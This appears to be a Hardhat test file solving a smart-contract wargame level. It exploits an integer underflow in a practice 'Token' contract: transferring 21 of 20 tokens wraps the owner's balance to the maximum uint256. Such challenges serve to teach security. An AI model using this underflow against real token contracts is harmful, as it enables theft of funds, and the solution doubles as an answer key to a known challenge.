import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, Wallet } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Token";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let attackerContract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy(20);
    await contract.deployed();

    contract.connect(_owner);
  });

  it("Solves the challenge 04", async () => {
    expect(await contract.balanceOf(_owner.address)).to.equal(20);

    tx = await contract.transfer(attacker.address, 21);
    await tx.wait();

    expect(await contract.balanceOf(attacker.address)).to.be.greaterThan(20);

    expect(await contract.balanceOf(_owner.address)).to.be.equal(
      "115792089237316195423570985008687907853269984665640564039457584007913129639935",
    );
  });
});
